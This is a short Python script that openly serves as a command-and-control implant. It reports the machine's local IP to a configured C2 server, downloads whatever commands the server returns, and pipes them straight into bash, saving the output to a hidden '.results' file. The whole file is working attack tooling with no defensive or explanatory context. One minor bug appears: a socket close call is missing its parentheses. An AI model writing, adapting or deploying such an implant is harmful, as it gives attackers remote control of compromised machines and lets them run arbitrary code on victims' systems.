"""
Hit dat C2, get dem commands
"""

import socket
import sys
from subprocess import *

SERVER_IP = "127.0.0.1:5000"    # C2 IP:port


def get_ip():
    # Get the preffered IP of the local machine
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(("8.8.8.8", 80))
    ip = s.getsockname()[0]
    s.close
    return ip

def callback(ip, server):
    cb_url = "http://" + server + "/" + ip + "/enderman"
    try:
        import urllib.request as urllib
    except:
        import urllib
    code = urllib.urlopen(cb_url).readlines()
    out = open(".results","w")
    p = Popen("bash", stdin=PIPE, stdout=out, stderr=out)
    for line in code:
        p.stdin.write(line)
    p.communicate()
    out.close()

ip = get_ip()
callback(ip, SERVER_IP)